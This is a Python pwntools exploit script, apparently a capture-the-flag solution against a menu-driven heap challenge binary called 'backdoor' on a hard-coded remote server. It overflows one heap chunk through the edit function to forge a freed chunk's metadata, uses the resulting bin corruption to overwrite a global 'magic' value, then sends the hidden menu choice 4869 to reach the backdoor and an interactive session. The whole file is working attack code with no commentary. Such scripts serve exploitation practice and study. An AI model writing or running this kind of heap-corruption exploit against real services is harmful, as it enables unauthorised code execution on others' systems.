from pwn import *
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./backdoor"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("1.95.36.136", 2134)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def create(size, content=""):
    io.sendlineafter(b"Your choice :", b"1")
    io.sendlineafter(b"Size of Heap :", str(size).encode())
    io.sendlineafter(b"Content of heap:", content)


def edit(index, size, content=""):
    io.sendlineafter(b"Your choice :", b"2")
    io.sendlineafter(b"Index :", str(index).encode())
    io.sendlineafter(b"Size of Heap :", str(size).encode())
    io.sendlineafter(b"Content of heap :", content)


def delete(index):
    io.sendlineafter(b"Your choice :", b"3")
    io.sendlineafter(b"Index :", str(index).encode())


backdoor = 0x0400C50
magic = 0x6020A0
payload = b""

create(0x20, "aaaaaaaa")
create(0x80, "bbbbbbbb")
create(0x20, "cccccccc")

ddebug("b malloc\n b free\n continue")
delete(1)
payload += b"t"*0x20
payload += p64(0x10)
payload += p64(0x91)
payload += p64(magic-0x10)
payload += p64(magic-0x10)

edit(0, len(payload), payload)
create(0x80, p64(0x1000))

io.sendlineafter("Your choice :", str(4869))
io.interactive()
